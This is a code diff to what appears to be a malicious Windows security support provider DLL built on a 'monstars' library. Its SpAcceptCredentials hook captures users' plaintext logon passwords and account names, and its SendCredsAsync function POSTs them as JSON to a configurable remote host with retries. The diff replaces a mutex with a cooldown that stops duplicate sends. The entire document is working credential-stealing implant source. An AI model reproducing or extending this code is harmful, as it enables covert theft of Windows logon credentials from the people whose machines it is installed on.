@@ -11,13 +11,16 @@
 #include <monstars/memory.h>
 #include <monstars/mutex.h>
 #include <monstars/object.h>
+#include <monstars/util.h>
 
 #include "provider.h"
 
 SECPKG_FUNCTION_TABLE g_SecurityPackageFunctionTable = {};
 
-HANDLE g_SendMutex = nullptr;
-FILETIME g_LastAuthTime = {};
+// SpAcceptCredentials seems to be called twice per authentication
+//   - add a cooldown to avoid redundant POST requests
+monstars::Cooldown g_cooldown(c_ReauthCooldown);
+
 wchar_t g_LastAuthUser[MAX_PATH] = {};
 
 // stampable values - configured via web interface or helper script
@@ -74,24 +77,14 @@ DWORD SendCredsAsync(void* credsPtr)
     uint32_t attempts = c_ConnectAttempts;
     do
     {
-        // scoped lock
+        monstars::HttpClient client(c_Hostname);
+        if (client.PostRequest(c_Endpoint, jsonBuf.Get(), jsonLen, c_ContentType))
         {
-            monstars::MutexLock lock(g_SendMutex, 300000);  // 5 minute timeout
-            if (!lock)
-            {
-                DEBUG_PRINTW(L"lock timeout, this is probably bad\n");
-                continue;
-            }
-            monstars::HttpClient client(c_Hostname);
-            if (client.PostRequest(c_Endpoint, jsonBuf.Get(), jsonLen, c_ContentType))
-            {
-                return ERROR_SUCCESS;
-            }
-            if (client.Forbidden())
-            {
-                return ERROR_ACCESS_DENIED;
-            }
-            DEBUG_PRINTW(L"connection failed, retrying after wait\n");
+            return ERROR_SUCCESS;
+        }
+        if (client.Forbidden())
+        {
+            return ERROR_ACCESS_DENIED;
         }
         if (--attempts) Sleep(c_RetryInterval);
     } while (attempts);
@@ -108,16 +101,12 @@ SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName,
 {
     DEBUG_PRINTW(L"SpAcceptCredentials called\n");
 
+
     if (PrimaryCredentials->Password.Length)
     {
-        // SpAcceptCredentials seems to be called twice per authentication
-        //   - add a cooldown to avoid redundant POST requests
-        FILETIME time;
-        GetSystemTimeAsFileTime(&time);
-        if ((time.dwLowDateTime - g_LastAuthTime.dwLowDateTime > c_ReauthCooldown)
-            || lstrcmpW(AccountName->Buffer, g_LastAuthUser))
+        // skip if we *just* got creds for this user
+        if (g_cooldown || lstrcmpW(AccountName->Buffer, g_LastAuthUser))
         {
-            g_LastAuthTime = time;
             monstars::memset(g_LastAuthUser, 0, sizeof(g_LastAuthUser));
             monstars::memcpy(g_LastAuthUser, sizeof(g_LastAuthUser), AccountName->Buffer, AccountName->Length);
 
@@ -176,11 +165,9 @@ DllMain(HINSTANCE hInstance, DWORD reason, LPVOID reserved)
     {
     case DLL_PROCESS_ATTACH:
         DEBUG_PRINTW(L"process attach\n");
-        g_SendMutex = CreateMutexW(nullptr, false, nullptr);
         break;
     case DLL_PROCESS_DETACH:
         DEBUG_PRINTW(L"process detach\n");
-        if (g_SendMutex) CloseHandle(g_SendMutex);
         break;
     default:
         break;
